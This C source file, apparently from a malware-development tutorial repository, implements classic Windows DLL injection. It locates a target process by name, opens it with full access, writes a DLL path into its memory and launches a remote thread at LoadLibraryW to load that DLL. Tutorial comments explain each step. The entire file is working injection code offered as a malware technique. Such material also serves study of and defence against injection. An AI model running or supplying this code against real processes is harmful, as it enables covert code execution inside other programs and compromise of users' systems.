/* 
With a working DLL, we can now move on to Dll Injection

The actual injection will be very similar to shellcode injection with a few minor changes
*/

#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

// to make our lives easier, we will also define our debug symbols
char ok[4] = "(+)";
char in[4] = "(*)";
char err[4] = "(-)";

// we define the dll path and its size
wchar_t dllLocation[MAX_PATH] = L"C:\\Users\\Joker\\Documents\\GitHub\\Malware-Development\\ProcessInjection\\DLL Injection\\DllBasics.dll";
size_t pathSize = sizeof(dllLocation);

// we will simply reuse the find target method from shellcode injection
int FindTarget(const char* procname){
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcSnap == INVALID_HANDLE_VALUE){
        printf("\n%s Failed to take snapshot, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcSnap, &pe32)){

        printf("\n%s Failed to parse snapshot, error: %ld", err, GetLastError());
        CloseHandle(hProcSnap);
        return EXIT_FAILURE;
    }
    
    while(Process32Next(hProcSnap, &pe32)){
        if (strcmp(pe32.szExeFile, procname) == 0){
            pid = pe32.th32ProcessID;
            break;            
        }       
    }
    CloseHandle(hProcSnap);
    return pid;
}

int Inject(HANDLE hProc){
    PVOID rBaseAddress = NULL; // buffer that will store the base of the allocated memory
    HANDLE hThread = NULL;

    printf("\n%s Allocating memory...", ok);

    rBaseAddress = VirtualAllocEx(hProc, rBaseAddress, pathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

    if(rBaseAddress == NULL){
        printf("\n%s Allocate memory failed, error: %ld", err, GetLastError());
        return EXIT_FAILURE;
    }

    printf("\n%s Allocate memory success", ok);
    printf("\n%s Writing to memory...", ok);

    if(!WriteProcessMemory(hProc, rBaseAddress, (LPVOID)dllLocation, pathSize, NULL)){
        printf("\n%s Failed to write process memory, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    printf("\n%s Write to memory success", ok);
    printf("\n%s Finding LoadLibraryW", ok);
    /*
    This is where we see the first unfamiliar piece of code.
    In order to pull off our injection, we want to use the LoadLibrary API to load our DLL. But in order to do that, we need to retrieve the address of the function
    We can do this using GetProcAddress and GetModuleHandle
    */
    
    // We need to create a start routine object which we will pass to the thread
    PTHREAD_START_ROUTINE start_routine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

    printf("\n%s Found LoadLibraryW", ok);
    printf("\n%s Start Routine created", ok);

    printf("\n%s Creating Thread...", ok);
    hThread = CreateRemoteThread(hProc, NULL, 0, start_routine, rBaseAddress, 0, NULL);

    if(hThread == NULL){
        printf("\n%s Failed to create thread", err);
        return EXIT_FAILURE;
    }

    printf("\n%s Thread Created...", ok);
    printf("\n%s Closing Handles...", ok);

    CloseHandle(hThread);

    return EXIT_SUCCESS;
}

int main(int argc, const char* argv[]){
    if (argc < 2 || argc > 2){
        printf("\n%s Usage: %s <process name>\n", err, argv[0]);
        return EXIT_FAILURE;
    }

    int pid = 0;
    const char* procname = argv[1];
    HANDLE hProc;


    pid = FindTarget(procname);

    if(pid == EXIT_FAILURE || pid == 0){
        printf("\n%s Could not find target", err);

        if(pid == EXIT_FAILURE){
            printf("\n(-) Process not found. Are you sure the target process is running?");
        }

        return EXIT_FAILURE;
    }

    if(pid){ //if pid is not null
        printf("\n(+) %s PID = %d", procname, pid);

        //open handle
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

        if (!hProc || hProc == NULL){
            printf("\n%s Could not get handle to process [%d], err: %ld", err, pid, GetLastError());
            return EXIT_FAILURE;
        }

        printf("\n%s Got handle to process [%d]", ok, pid);

        Inject(hProc);
    }

    CloseHandle(hProc);
     return EXIT_SUCCESS;
}